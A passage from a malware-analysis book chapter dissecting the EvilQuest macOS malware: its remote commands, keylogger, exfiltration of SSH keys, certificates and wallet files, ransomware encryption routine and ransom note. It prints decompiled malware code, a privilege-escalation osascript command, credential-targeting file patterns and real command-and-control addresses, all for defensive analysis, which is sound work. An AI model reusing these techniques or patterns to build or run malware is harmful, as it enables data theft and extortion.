<p>If the in-memory execution fails, the malware contains backup logic and instead writes out the payload to a file named <em>.xookc</em>, sets it to be executable via <code>chmod</code>, and then executes via the following: </p>
<pre><code>osascript -e "do shell script \"sudo open .xookc\" with administrator privileges"</code></pre>
<h3 id="h2-501942c11-0013"><span epub:type="pagebreak" id="Page_268" title="268"/>react_save (0x2)</h3>
<p class="BodyFirst">The <code>0x2</code> command causes the malware to execute a function named <code>react_save</code>. This function downloads an executable file from the command and control server to the infected system. </p>
<p>Take a look at the decompiled code of this function in <a href="#listing11-49" id="listinganchor11-49">Listing 11-49</a>, which is implemented at <code>0x000000010000a300</code>. We can see it first decodes data received from the server via a call to the <code>eib_decode</code> function. Then it saves this data to a file with a filename specified by the server. Once the file is saved, <code>chmod</code> is invoked with <code>0x1ed</code> (or <code>0755</code> octal), which sets the file’s executable bit. </p>
<pre><code>int react_save(int arg0) {<br/>    ...<br/>    decodedData = eib_decode(...data from server...);<br/>    file = fopen(name, "wb");<br/>    fwrite(decodedData, 0x1, length, file);<br/>    fclose(file);<br/>    chmod(name, 0x1ed);<br/>    ...</code></pre>
<p class="CodeListingCaption"><a id="listing11-49">Listing 11-49</a>: The core logic of the <code>react_save</code> function</p>
<h3 id="h2-501942c11-0014">react_start (0x4)</h3>
<p class="BodyFirst">If EvilQuest receives command <code>0x4</code> from the server, it invokes a method named <code>react_start</code>. However, this function is currently unimplemented and simply sets the <code>EAX</code> register to <code>0</code> via the XOR instruction <span aria-label="annotation1" class="CodeAnnotation">1</span> (<a href="#listing11-50" id="listinganchor11-50">Listing 11-50</a>):</p>
<pre><code>dispatch:<br/>0x000000010000a7e0    push<br/>0x000000010000a7e1    mov        rbp, rsp<br/>...<br/><br/>0x000000010000a826    cmp        dword [rax], 0x4<br/>0x000000010000a829    jne        continue<br/>0x000000010000a82f    mov        rdi, qword [rbp+var_10]<br/>0x000000010000a833    call       react_start<br/><br/>react_start:<br/>0x000000010000a460    push       rbp<br/>0x000000010000a461    mov        rbp, rsp<br/>0x000000010000a464    xor      <span aria-label="annotation1" class="CodeAnnotationCode2">1</span> eax, eax<br/>0x000000010000a466    mov        qword [rbp+var_8], rdi<br/>0x000000010000a46a    pop        rbp<br/>0x000000010000a46b    ret</code></pre>
<p class="CodeListingCaption"><a id="listing11-50">Listing 11-50</a>: The <code>react_start</code> function remains unimplemented </p>
<p>In future versions of the malware, perhaps we’ll see completed versions of this (and the other currently unimplemented) commands. </p>
<h3 id="h2-501942c11-0015"><span epub:type="pagebreak" id="Page_269" title="269"/>react_keys (0x8)</h3>
<p class="BodyFirst">If EvilQuest encounters command <code>0x8</code>, it will invoke a function named <code>react_keys</code>, which kicks off keylogging logic. A closer look at the disassembly of the <code>react_keys</code> function reveals it spawns a background thread to execute a function named <code>eilf_rglk_watch_routine</code>. This function invokes various CoreGraphics APIs that allow a program to intercept user keypresses (<a href="#listing11-51" id="listinganchor11-51">Listing 11-51</a>):</p>
<pre><code>eilf_rglk_watch_routine:<br/>0x000000010000d460    push       rbp <br/>0x000000010000d461    mov        rbp, rsp<br/>...<br/><br/>0x000000010000d48f    call       CGEventTapCreate<br/>...<br/>0x000000010000d4d2    call       CFMachPortCreateRunLoopSource<br/>...<br/>0x000000010000d4db    call       CFRunLoopGetCurrent <br/>...<br/>0x000000010000d4f1    call       CFRunLoopAddSource<br/>...<br/>0x000000010000d4ff    call       CGEventTapEnable<br/>...<br/>0x000000010000d504    call       CFRunLoopRun</code></pre>
<p class="CodeListingCaption"><a id="listing11-51">Listing 11-51</a>: Keylogger logic, found within the <code>eilf_rglk_watch_routine</code> function</p>
<p>Specifically, the function creates an event tap via the <code>CGEventTapCreate</code> API, adds it to the current run loop, and then invokes the <code>CGEventTapEnable</code> to activate the event tap. Apple’s documentation for <code>CGEventTapCreate</code> specifies that it takes a user-specified callback function that will be invoked for each event, such as a keypress.<sup class="endnote"><a href="#c11-endnote-4" id="c11-noteref-4">4</a></sup> As this callback is the <code>CGEventTapCreate</code> function’s fifth argument, it will be passed in the <code>R8</code> register (<a href="#listing11-52" id="listinganchor11-52">Listing 11-52</a>): </p>
<pre><code>0x000000010000d488    lea       r8, qword [process_event] <br/>0x000000010000d48f    call      CGEventTapCreate</code></pre>
<p class="CodeListingCaption"><a id="listing11-52">Listing 11-52</a>: The callback argument for the <code>CGEventTapCreate</code> function</p>
<p>Taking a peek at the malware’s <code>process_event</code> callback function reveals it’s converting the keypress (a numeric key code) to a string via a call to a helper function named <code>kconvert</code>. However, instead of logging this captured keystroke or exfiltrating it directly to the attacker, it simply prints it out locally (<a href="#listing11-53" id="listinganchor11-53">Listing 11-53</a>): </p>
<pre><code>int process_event(...) {<br/>   ...<br/><br/>   keycode = kconvert(CGEventGetIntegerValueField(keycode, 0x9) &amp; 0xffff);<br/>   printf("%s\n", keycode);</code></pre>
<p class="CodeListingCaption"><a id="listing11-53">Listing 11-53</a>: The keylogger’s callback function, <code>process_event</code></p>
<p>Maybe this code is still a work in progress.</p>
<h3 id="h2-501942c11-0016"><span epub:type="pagebreak" id="Page_270" title="270"/>react_ping (0x10)</h3>
<p class="BodyFirst">The next command, <code>react_ping</code>, is invoked if the malware receives a <code>0x10</code> from the server (<a href="#listing11-54" id="listinganchor11-54">Listing 11-54</a>). The <code>react_ping</code> first decrypts the encrypted string, <code>"1|N|2P1RVDSH0KfURs3Xe2Nd0000073"</code>, and then compares it with a string it has received from the server: </p>
<pre><code>react_ping:<br/>0x000000010000a500    push      rbp        <br/>0x000000010000a501    mov       rbp, rsp<br/>...<br/><br/>0x000000010000a517    lea       rax, qword [a1n2p1rvdsh0kfu] ; "1|N|2P1RVDS..."<br/>...<br/>0x000000010000a522    mov       rdi, rax<br/>0x000000010000a525    call      ei_str <br/>...<br/>0x000000010000a52c    mov       rdi, qword [rbp+strFromServer]<br/>0x000000010000a530    mov       rsi, rax<br/>0x000000010000a536    call      strcmp<br/>...</code></pre>
<p class="CodeListingCaption"><a id="listing11-54">Listing 11-54</a>: The core logic of the <code>react_ping</code> function</p>
<p>Using our decryptor library, or a debugger, we can decrypt the string, which reads “Hi there.” If the server sends the “Hi there” message to the malware, the string comparison will succeed, and <code>react_ping</code> will return a success. Based on this command’s name and its logic, it is likely used by the remote attack to check the status (or availability) of an infected system. This is, of course, rather similar to the popular <code>ping</code> utility, which can be used to test the reachability of a remote host. </p>
<h3 id="h2-501942c11-0017">react_host (0x20)</h3>
<p class="BodyFirst">Next we find logic to execute a function named <code>react_host</code> if a <code>0x20</code> is received from the server. However, as was the case with the <code>react_start</code> function, <code>react_host</code> is currently unimplemented and simply returns <code>0x0</code>.</p>
<h3 id="h2-501942c11-0018">react_scmd (0x40)</h3>
<p class="BodyFirst">The final command supported by EvilQuest invokes a function named <code>react_scmd</code> in response to a <code>0x40</code> from the server (<a href="#listing11-55" id="listinganchor11-55">Listing 11-55</a>): </p>
<pre><code>react_scmd:<br/>0x0000000100009e80    push       rbp<br/>0x0000000100009e81    mov        rbp, rsp<br/>...<br/><br/>0x0000000100009edd    mov        rdi, qword [command]<br/>0x0000000100009ee1    lea        rsi, qword [mode]<br/>0x0000000100009eec    call       popen<br/>...<br/><span epub:type="pagebreak" id="Page_271" title="271"/>0x0000000100009f8e    call       fread<br/>...<br/>0x000000010000a003    call       eicc_serialize_request<br/>...<br/>0x000000010000a123    call       http_request</code></pre>
<p class="CodeListingCaption"><a id="listing11-55">Listing 11-55</a>: The core logic of the <code>react_scmd</code> function</p>
<p>This function will execute a command specified by the server via the <code>popen</code> API. Once the command has been executed, the output is captured and transmitted to the server via the <code>eicc_serialize_request</code> and <code>http_request</code> functions.</p>
<p>This wraps up the analysis of EvilQuest’s remote tasking capabilities. Though some of the commands appear incomplete or unimplemented, others afford a remote attacker the ability to download additional updates or payloads and execute arbitrary commands on an infected system. </p>
<h2 id="h1-501942c11-0005">The File Exfiltration Logic</h2>
<p class="BodyFirst">One of EvilQuest’s main capabilities is the exfiltration of a full directory listing and files that match a hardcoded list of regular expressions. In this section we’ll analyze the relevant code to understand this logic. </p>
<h3 id="h2-501942c11-0019">Directory Listing Exfiltration</h3>
<p class="BodyFirst">Starting in the main function, the malware creates a background thread to execute a function named <code>ei_forensic_thread</code>, as shown in <a href="#listing11-56" id="listinganchor11-56">Listing 11-56</a>:</p>
<pre><code>rax = pthread_create(&amp;thread, 0x0, ei_forensic_thread, &amp;args);<br/>if (rax != 0x0) {<br/>   printf("Cannot create thread!\n");<br/>   exit(-1);<br/>} </code></pre>
<p class="CodeListingCaption"><a id="listing11-56">Listing 11-56</a>: Executing the <code>ei_forensic_thread</code> function via a background thread</p>
<p>The <code>ei_forensic_thread</code> function first invokes the <code>get_mediator</code> function, described in the previous section, to determine the address of the command and control server. It then invokes a function named <code>lfsc_dirlist</code>, passing in an encrypted string (that decrypts to <code>"/Users"</code>), as seen in <a href="#listing11-57" id="listinganchor11-57">Listing 11-57</a>:</p>
<pre><code>0x000000010000170a    mov        rdi, qword [rbp+rax*8+var_30]<br/>0x000000010000170f    call       ei_str<br/>...<br/>0x0000000100001714    mov        rdi, qword [rbp+var_10]<br/>0x0000000100001718    mov        esi, dword [rdi+8]<br/>0x000000010000171b    mov        rdi, rax<br/>0x000000010000171e    call       lfsc_dirlist</code></pre>
<p class="CodeListingCaption"><a id="listing11-57">Listing 11-57</a>: Invoking the <code>lfsc_dirlist</code> function</p>
<p><span epub:type="pagebreak" id="Page_272" title="272"/>The <code>lfsc_dirlist</code> function performs a recursive directory listing, starting at a specified root directory and searching each of its files and directories. After we step over the call to <code>lfsc_dirlist</code> in the following debugger output, we can see that the function returns this recursive directory listing, which indeed starts at <code>"/Users"</code> (<a href="#listing11-58" id="listinganchor11-58">Listing 11-58</a>):</p>
<pre><code># <b>lldb /Library/mixednkey/toolroomd</b><br/>...<br/><br/>(lldb) <b>b 0x000000010000171e</b><br/>Breakpoint 1: where = toolroomd`toolroomd[0x000000010000171e], address = 0x000000010000171e<br/><br/>(lldb) <b>c</b><br/><br/>* thread #4, stop reason = breakpoint 1.1<br/>-&gt;  0x10000171e: callq  lfsc_dirlist<br/><br/>(lldb)<b> </b><b>ni</b><br/><br/>(lldb) <b>x/s $rax</b><br/>0x10080bc00: <br/> "/Users/user<br/>  /Users/Shared<br/>  /Users/user/Music<br/>  /Users/user/.lldb<br/>  /Users/user/Pictures<br/>  /Users/user/Desktop<br/>  /Users/user/Library<br/>  /Users/user/.bash_sessions<br/>  /Users/user/Public<br/>  /Users/user/Movies<br/>  /Users/user/.Trash<br/>  /Users/user/Documents<br/>  /Users/user/Downloads<br/>  /Users/user/Library/Application Support<br/>  /Users/user/Library/Maps<br/>  /Users/user/Library/Assistant<br/>  ...</code></pre>
<p class="CodeListingCaption"><a id="listing11-58">Listing 11-58</a>: The generated (recursive) directory listing</p>
<p>If you consult the disassembly, you’ll be able to see that this directory listing is then sent to the attacker’s command and control server via a call to the malware’s <code>ei_forensic_sendfile</code> function.</p>
<h3 id="h2-501942c11-0020">Certificate and Cryptocurrency File Exfiltration</h3>
<p class="BodyFirst">Once the infected system’s directory listing has been exfiltrated, EvilQuest once again invokes the <code>get_targets</code> function. Recall that, given a root directory such as <em>/Users</em>, the <code>get_targets</code> function recursively generates a list of files. For each file encountered, the malware applies a callback function to <span epub:type="pagebreak" id="Page_273" title="273"/>check whether the file is of interest. In this case, <code>get_targets</code> is invoked with the <code>is_lfsc_target</code> callback:</p>
<pre><code>rax = get_targets(rax, &amp;var_18, &amp;var_1C, <b>is_lfsc_target</b>); </code></pre>
<p>In <a href="#listing11-59" id="listinganchor11-59">Listing 11-59</a>’s abridged decompilation, note that the <code>is_lfsc_target</code> callback function invokes two helper functions, <code>lfsc_parse_template</code> and <code>is_lfsc_target</code>, to determine if a file is of interest:</p>
<pre><code>int is_lfsc_target(char* file) {<br/> <br/>    memcpy(&amp;templates, <span aria-label="annotation1" class="CodeAnnotationCode">1</span> 0x100013330, 0x98);<br/>    isTarget = 0x0;<br/>    length = strlen(file);<br/>    index = 0x0;<br/>    do {<br/>            if(isTarget) break;<br/>            if(index &gt;= 0x13) break;<br/><br/>            template = ei_str(templates+index*8);<br/>            parsedTemplate = lfsc_parse_template(template);<br/>            if(lfsc_match(parsedTemplate, file, length) == 0x1) <br/>            {<br/>               isTarget = 0x1;<br/>            }<br/><br/>            index++;<br/><br/>    } while (true);<br/><br/>    return isTarget;<br/>}</code></pre>
<p class="CodeListingCaption"><a id="listing11-59">Listing 11-59</a>: Core logic of the <code>is_lfsc_target</code> function</p>
<p>From this decompilation, we can also see that the templates used to determine if a file is of interest are loaded from <code>0x100013330</code> <span aria-label="annotation1" class="CodeAnnotation">1</span>. If we check this address, we find a list of encrypted strings, shown in <a href="#listing11-60" id="listinganchor11-60">Listing 11-60</a>: </p>
<pre><code>0x0000000100013330    dq   0x0000000100010a95 ; "2Y6ndF3HGBhV3OZ5wT2ya9se0000053",<br/>0x0000000100013338    dq   0x0000000100010ab5 ; "3mkAT20Khcxt23iYti06y5Ay0000083"<br/>0x0000000100013340    dq   0x0000000100010ad5 ; "3mTqdG3tFoV51KYxgy38orxy0000083"<br/>0x0000000100013348    dq   0x0000000100010af5 ; "2Glxas1XPf4|11RXKJ3qj71m0000023"<br/>...</code></pre>
<p class="CodeListingCaption"><a id="listing11-60">Listing 11-60</a>: Encrypted list of files of “interest” </p>
<p>Thanks to our injected decryptor library, we have the ability to decrypt this list (<a href="#listing11-61" id="listinganchor11-61">Listing 11-61</a>): </p>
<pre><code>% <b>DYLD_INSERT_LIBRARIES=/tmp/decryptor.dylib /Library/mixednkey/toolroomd</b><b/><br/>...<br/>decrypted string (0x100010a95): *id_rsa*/i<br/><span epub:type="pagebreak" id="Page_274" title="274"/>decrypted string (0x100010ab5): *.pem/i<br/>decrypted string (0x100010ad5): *.ppk/i<br/>decrypted string (0x100010af5): known_hosts/i<br/>decrypted string (0x100010b15): *.ca-bundle/i<br/>decrypted string (0x100010b35): *.crt/i<br/>decrypted string (0x100010b55): *.p7!/i<br/>decrypted string (0x100010b75): *.!er/i<br/>decrypted string (0x100010b95): *.pfx/i<br/>decrypted string (0x100010bb5): *.p12/i<br/>decrypted string (0x100010bd5): *key*.pdf/i<br/>decrypted string (0x100010bf5): *wallet*.pdf/i<br/>decrypted string (0x100010c15): *key*.png/i<br/>decrypted string (0x100010c35): *wallet*.png/i<br/>decrypted string (0x100010c55): *key*.jpg/i<br/>decrypted string (0x100010c75): *wallet*.jpg/i<br/>decrypted string (0x100010c95): *key*.jpeg/i<br/>decrypted string (0x100010cb5): *wallet*.jpeg/i<br/>...</code></pre>
<p class="CodeListingCaption"><a id="listing11-61">Listing 11-61</a>: Decrypted list of files of “interest” </p>
<p>From the decrypted list, we can see that EvilQuest has a propensity for sensitive files, such as certificates and cryptocurrency wallets and keys!</p>
<p>Once the <code>get_targets</code> function returns a list of files that match these templates, the malware reads each file’s contents via a call to <code>lfsc_get_contents</code> and then exfiltrates the contents to the command and control server using the <code>ei_forensic_sendfile</code> function (<a href="#listing11-62" id="listinganchor11-62">Listing 11-62</a>):</p>
<pre><code>get_targets("/Users", &amp;targets, &amp;count, is_lfsc_target);<br/><br/>for (index = 0x0; index &lt; count; ++index) {<br/><br/>      targetPath = targets[index];<br/><br/>      lfsc_get_contents(targetPath, &amp;targetContents, &amp;targetContentSize);<br/>      ei_forensic_sendfile(targetContents, targetContentSize, ...);<br/><br/>      ...</code></pre>
<p class="CodeListingCaption"><a id="listing11-62">Listing 11-62</a>: File exfiltration via the <code>ei_forensic_sendfile</code> function</p>
<p>We can confirm this logic in a debugger by creating a file on the desktop named <em>key.png</em> and setting a breakpoint on the call to <code>lfsc_get_contents</code> at <code>0x0000000100001965</code>. Once the breakpoint is hit, we print out the contents of the first argument (<code>RDI</code>) and see that, indeed, the malware is attempting to read and then exfiltrate the <em>key.png</em> file (<a href="#listing11-63" id="listinganchor11-63">Listing 11-63</a>):</p>
<pre><code># <b>lldb /Library/mixednkey/toolroomd</b><br/>...<br/><br/>(lldb) <b>b 0x0000000100001965</b><br/>Breakpoint 1: where = toolroomd`toolroomd[0x0000000100001965], address = 0x0000000100001965<br/><br/>(lldb) <b>c</b><br/><br/><span epub:type="pagebreak" id="Page_275" title="275"/>* thread #4, stop reason = breakpoint 1.1<br/>-&gt;  0x100001965: callq  lfsc_get_contents<br/><br/>(lldb) <b>x/s $rdi</b><br/>0x1001a99b0: "/Users/user/Desktop/key.png"</code></pre>
<p class="CodeListingCaption"><a id="listing11-63">Listing 11-63</a>: Observing file exfiltration logic via the debugger</p>
<p>Now we know that if a user becomes infected with EvilQuest, they should assume that all of their certificates, wallets, and keys belong to the attackers.</p>
<h2 id="h1-501942c11-0006">File Encryption Logic</h2>
<p class="BodyFirst">Recall that Dinesh Devadoss, the researcher who discovered EvilQuest, noted that the malware contained ransomware capabilities. Let’s continue our analysis efforts by focusing on this ransomware logic. You can find the relevant code from the main function, where the malware invokes a method named <code>s_is_high_time</code> and then waits on several timers to expire before kicking off the encryption logic, which begins in a function named <code>ei_carver_main</code> (<a href="#listing11-64" id="listinganchor11-64">Listing 11-64</a>):</p>
<pre><code>if ( (s_is_high_time(var_80) != 0x0) &amp;&amp; <br/>     ( ( (ei_timer_check(var_70) == 0x1) &amp;&amp; <br/>         (ei_timer_check(var_130) == 0x1)) &amp;&amp; <br/>         (var_11C &lt; 0x2))) {<br/>         ...<br/>         ei_carver_main(*var_10, &amp;var_120);</code></pre>
<p class="CodeListingCaption"><a id="listing11-64">Listing 11-64</a>: Following timer checks, the <code>ei_carver_main</code> function is invoked.</p>
<p>Of particular note is the <code>s_is_high_time</code> function, which invokes the <code>time</code> API function and then compares the returned time epoch with the hardcoded value <code>0x5efa01f0</code>. This value resolves to Monday, June 29, 2020 15:00:00 GMT. If the date on an infected system is before this, the function will return a <code>0</code>, and the file encryption logic will not be invoked. In other words, the malware’s ransomware logic will only be triggered at or after this date and time. </p>
<p>If we take a look at the <code>ei_carver_main</code> function’s disassembly at <code>0x000000010000ba50</code>, we can see it first generates the encryption key by calling the <code>random</code> API, as well as functions named <code>eip_seeds</code> and <code>eip_key</code>. Following this, it invokes the <code>get_targets</code> function. Recall that this function recursively generates a list of files from a root directory by using a specified callback function to filter the results. In this instance, the root directory is <em>/Users</em>. </p>
<p>The callback function, <code>is_file_target</code>, will only match certain file extensions. You can find this encrypted list of extensions hardcoded within the malware at <code>0x000000010001299e</code>. Using our injectable decryptor library, we can recover this rather massive list of target file extensions, which includes <em>.zip</em>, <em>.dmg</em>, <em>.pkg</em>, <em>.jpg</em>, <em>.png</em>, <em>.mp3</em>, <em>.mov</em>, <em>.txt</em>, <em>.doc</em>, <em>.xls</em>, <em>.ppt</em>, <em>.pages</em>, <em>.numbers</em>, <em>.keynote</em>, <em>.pdf</em>, <em>.c</em>, <em>.m</em>, and more. </p>
<p><span epub:type="pagebreak" id="Page_276" title="276"/>After it has generated a list of target files, the malware completes a key-generation process by calling <code>random_key</code>, which in turn calls <code>srandom</code> and <code>random</code>. Then the malware calls a function named <code>carve_target</code> on each target file, as seen in <a href="#listing11-65" id="listinganchor11-65">Listing 11-65</a>: </p>
<pre><code>result = get_targets("/Users", &amp;targets, &amp;count, is_file_target);<br/>if (result == 0x0) {<br/><br/>     key = random_key();<br/><br/>     for (index = 0x0; index &lt; count; index++) {<br/>         carve_target(targets[i], key, ...);<br/><br/><br/>     }<br/>    }</code></pre>
<p class="CodeListingCaption"><a id="listing11-65">Listing 11-65</a>: Encrypting (ransoming) target files</p>
<p>The <code>carve_target</code> function takes the path of the file to encrypt and various encryption key values. If we analyze the disassembly of the function or step through it in a debugging session, we’ll see that it performs the following actions to encrypt each file:</p>
<ol class="decimal">
<li value="1">Makes sure the file is accessible via a call to <code>stat</code></li>
<li value="2">Creates a temporary filename by calling a function named <code>make_temp_name</code></li>
<li value="3">Opens the target file for reading</li>
<li value="4">Checks if the target file is already encrypted with a call to a function named <code>is_carved</code>, which checks for the presence of <code>0xddbebabe</code> at the end of the file</li>
<li value="5">Opens the temporary file for writing</li>
<li value="6">Reads <code>0x4000</code>-byte chunks from the target file</li>
<li value="7">Invokes a function named <code>tpcrypt</code> to encrypt the <code>0x4000</code> bytes</li>
<li value="8">Writes out the encrypted bytes to the temporary file</li>
<li value="9">Repeats steps 6–8 until all bytes have been read and encrypted from the target file</li>
<li value="10">Invokes a function named <code>eip_encrypt</code> to encrypt keying information, which is then appended to the temporary file</li>
<li value="11">Writes <code>0xddbebabe</code> to the end of the temporary file </li>
<li value="12">Deletes the target file</li>
<li value="13">Renames the temporary file to the target file</li>
</ol>
<p>Once EvilQuest has encrypted all files that match file extensions of interest, it writes out the text in <a href="#figure11-2" id="figureanchor11-2">Figure 11-2</a> to a file named <em>READ_ME_NOW.txt</em>.</p>
<span epub:type="pagebreak" id="Page_277" title="277"/><figure>
<img alt="The text in READ_ME_NOW.txt is as follows:  “YOUR IMPORTANT FILES ARE ENCRYPTED.  Many of your documents, photos, videos, images and other files are no longer accessible because they have been encrypted. Maybe you are busy looking for a way to recover your files, but do not waste your time. Nobody can recover your file without our decryption service. We use 256-bit AES algorithm so it will take you more than a billion years to break this encryption without knowing the key (you can read Wikipedia about AES if you don’t believe this statement). Anyways, we guarantee that you can recover your files safely and easily. This will require us to use some processing power, electricity and storage on our side, so there’s a fixed processing fee of 50 USD. This is a one-time payment, no additional fees included. In order to accept this offer, you have to deposit payment within 72 hours (3 days) after receiving this message, otherwise this offer will expire and you will lose your files forever. Payment has to be deposited in Bitcoin based on Bitcoin/USD exchange rate at the moment of payment. The address you have to make payment to is: 13roGMpWd7Pb3ZoJyce8eo0pfeg0vGHHK7. Decryption will start automatically within 2 hours after the payment has been processed and will take from 2 to 5 hours depending on the processing power of your computer. After that all of your files will be restored. THIS OFFER IS VALID FOR 72 HOURS AFTER RECEIVING THIS MESSAGE.”" class="" src="image_fi/501942c11/f11002.png"/>
<figcaption><p><a id="figure11-2">Figure 11-2</a>: EvilQuest’s ransom note</p></figcaption>
</figure>
<p>To make sure the user reads this file, the malware also displays a modal prompt and reads it aloud via macOS’s built-in <code>say</code> command. </p>
<p>If you peruse the code, you might notice a function named <code>uncarve_target</code>, implemented at <code>0x000000010000f230</code>, that is likely responsible for restoring ransomed files. Yet this function is never invoked. That is to say, no other code or logic references this function. You can confirm this by searching Hopper (or another disassembly tool) for references to the function’s address. As no such cross-references are found, it appears that paying the ransom won’t actually get you your files back. Moreover, the ransom note does not include any way to communicate with the attacker. As Phil Stokes put it, “there’s no way for you to tell the threat actors that you paid; no request for your contact address; and no request for a sample encrypted file or any other identifying factor.”<sup class="endnote"><a href="#c11-endnote-5" id="c11-noteref-5">5</a></sup> </p>
<p>Luckily for EvilQuest victims, researchers at SentinelOne reversed the cryptographic algorithm used to encrypt files and found a method of recovering the encryption key. In a write-up, Jason Reaves notes that the malware writers use symmetric key encryption, which relies on the same key to both encrypt and decrypt the file; moreover, “the cleartext key used for encoding the file encryption key ends up being appended to the encoded file encryption key.”<sup class="endnote"><a href="#c11-endnote-6" id="c11-noteref-6">6</a></sup> Based on their findings, the researchers were able to create a full decryptor, which they publicly released. </p>
<h2 id="h1-501942c11-0007">EvilQuest Updates</h2>
<p class="BodyFirst">Often malware specimens evolve, and defenders will discover new variants of them in the wild. EvilQuest is no exception. Before wrapping up our analysis of this insidious threat, let’s briefly highlight some changes <span epub:type="pagebreak" id="Page_278" title="278"/>found in later versions of EvilQuest (also called ThiefQuest). You can read more about these differences in a Trend Micro write-up titled “Updates on Quickly-Evolving ThiefQuest macOS Malware.”<sup class="endnote"><a href="#c11-endnote-7" id="c11-noteref-7">7</a></sup></p>
<h3 id="h2-501942c11-0021">Better Anti-Analysis Logic</h3>
<p class="BodyFirst">The Trend Micro write-up notes that later versions of EvilQuest contain “improved” anti-analysis logic. First and foremost, its function names have been obfuscated. This slightly complicates analysis efforts, as the function names in older versions were quite descriptive. </p>
<p>For example, the string decryption function <code>ei_str</code> has been renamed to <code>52M_rj</code>. We can confirm this by looking at the disassembly in the updated version of the malware (<a href="#listing11-66" id="listinganchor11-66">Listing 11-66</a>), where we see that at various locations in the code, <code>52M_rj</code> takes an encrypted string as its parameter:</p>
<pre><code>0x00000001000106a5    lea   rdi, qword [a2aawvq0k9vm01w] ; "2aAwvQ0k9VM01w..."<br/>0x00000001000106ac    call  52M_rj <br/>...<br/>0x00000001000106b5    lea   rdi, qword [a3zi8j820yphd00] ; "3zI8J820YPhd00..."<br/>0x00000001000106bc    call  52M_rj</code></pre>
<p class="CodeListingCaption"><a id="listing11-66">Listing 11-66</a>: Obfuscated function names</p>
<p>A quick triage of the <code>52M_rj</code> function confirms it contains the core logic to decrypt the malware’s embedded strings. </p>
<p>Another approach to mapping the old version of functions to their newer versions is by checking the system API calls they invoke. Take, for example, the <code>NSCreateObjectFileImageFromMemory</code> and <code>NSLinkModule</code> APIs that <code>EvilQuest </code>invokes as part of its in-memory payload execution logic. In the old version of the malware, we find these APIs invoked in a descriptively named function <code>ei_run_memory_hrd</code>, found at address <code>0x0000000100003790</code>. In the new version, when we come across a cryptically named function <code>52lMjg</code> that invokes these same APIs, we know we’re looking at the same function. In our disassembler, we can then rename <code>52lMjg</code> to <code>ei_run_memory_hrd</code>. </p>
<p>Moreover, in the old version of the malware, we know that the <code>ei_run_memory_hrd</code> function was invoked solely by a function named <code>react_exec</code>. You can check this by looking for references to the function in Hopper (<a href="#figure11-3" id="figureanchor11-3">Figure 11-3</a>). </p>
<figure>
<img alt="In Hopper, a search for “References to 0x100003790” results in the address “0x10000a1cd (__react_exec + 0x5d)” with the value “call    _ei_run_memory_hrd.”" class="keyline" src="image_fi/501942c11/f11003.png"/>
<figcaption><p><a id="figure11-3">Figure 11-3</a>: Cross-references to the <span class="LiteralInCaption"><code>ei_run_memory_hrd</code></span> function</p></figcaption>
</figure>
<p><span epub:type="pagebreak" id="Page_279" title="279"/>Now we can posit that the single cross-reference caller of the <code>52lMjg</code> function, named <code>52sCg</code>, is actually the <code>react_exec </code>function. This cross-reference method allows us to easily replace the non-descriptive names found in the new variant with their far more descriptive original names. </p>
<p>The malware authors also added other anti-analysis logic. For example, in the <code>ei_str</code> function (the one they renamed <code>52M_rj</code>), we find various additions, including anti-debugger logic. The function now makes a system call to <code>ptrace</code> (<code>0x200001a</code>) with the infamous <code>PT_DENY_ATTACH</code> value (<code>0x1f</code>) to complicate debugging efforts (<a href="#listing11-67" id="listinganchor11-67">Listing 11-67</a>):</p>
<pre><code>52M_rj:<br/>0x0000000100003020    push       rbp<br/>0x0000000100003021    mov        rbp, rsp<br/>...<br/>0x0000000100003034    mov        rcx, 0x0<br/>0x000000010000303b    mov        rdx, 0x0<br/>0x0000000100003042    mov        rsi, 0x0<br/>0x0000000100003049    mov        rdi, 0x1f<br/>0x0000000100003050    mov        rax, 0x200001a<br/>0x0000000100003057    syscall</code></pre>
<p class="CodeListingCaption"><a id="listing11-67">Listing 11-67</a>: Newly added anti-debugging logic</p>
<p>Trend Micro also notes that the detection logic in the <code>is_virtual_mchn</code> function has been expanded to more effectively detect analysts using virtual machines. The researchers write,</p>
<blockquote class="review">
<p class="Blockquote">In the function <code>is_virtual_mchn()</code>, condition checks including getting the MAC address, CPU count, and physical memory of the machine, have been increased.<sup class="endnote"><a href="#c11-endnote-8" id="c11-noteref-8">8</a></sup></p></blockquote>
<h3 id="h2-501942c11-0022">Modified Server Addresses</h3>
<p class="BodyFirst">Besides updates to anti-analysis logic, some of the strings found hardcoded and obfuscated in the malware’s binary have been modified. For example, the malware’s lookup URL for its command and control server and backup address have changed. Our injectable decryption library now returns the following for those strings:</p>
<pre><code>% <b>DYLD_INSERT_LIBRARIES=/tmp/decryptor.dylib OSX.EvilQuest_UPDATE</b> <br/>...<br/>decrypted string (0x106e9e154): lemareste.pythonanywhere.com<br/>decrypted string (0x106e9f7ca): 159.65.147.28</code></pre>
<h3 id="h2-501942c11-0023">A Longer List of Security Tools to Terminate</h3>
<p class="BodyFirst">The list of security tools that the malware attempts to terminate has been expanded to include certain Objective-See tools created by yours truly. As <span epub:type="pagebreak" id="Page_280" title="280"/>these tools have the ability to generically detect EvilQuest, it is unsurprising that the malware now looks for them (<a href="#listing11-68" id="listinganchor11-68">Listing 11-68</a>): </p>
<pre><code>% <b>DYLD_INSERT_LIBRARIES=/tmp/decryptor.dylib OSX.EvilQuest_UPDATE</b><b> </b><br/>...<br/>decrypted string (0x106e9f964): ReiKey<br/>decrypted string (0x106e9f978): KnockKnock</code></pre>
<p class="CodeListingCaption"><a id="listing11-68">Listing 11-68</a>: Additional “unwanted” programs, now including my very own ReiKey and KnockKnock</p>
<h3 id="h2-501942c11-0024">New Persistence Paths</h3>
<p class="BodyFirst">Paths related to persistence have been added, perhaps as a way to thwart basic detection signatures that sought to uncover EvilQuest infections based on the existing paths (<a href="#listing11-69" id="listinganchor11-69">Listing 11-69</a>):</p>
<pre><code>% <b>DYLD_INSERT_LIBRARIES=/tmp/decryptor.dylib OSX.EvilQuest_UPDATE </b><br/>...<br/>decrypted string (0x106e9f2ed): /Library/PrivateSync/com.apple.abtpd<br/>decrypted string (0x106e9f331): abtpd<br/><br/>decrypted string (0x106e9f998): com.apple.abtpd</code></pre>
<p class="CodeListingCaption"><a id="listing11-69">Listing 11-69</a>: Updated persistence paths</p>
<h3 id="h2-501942c11-0025">A Personal Shoutout</h3>
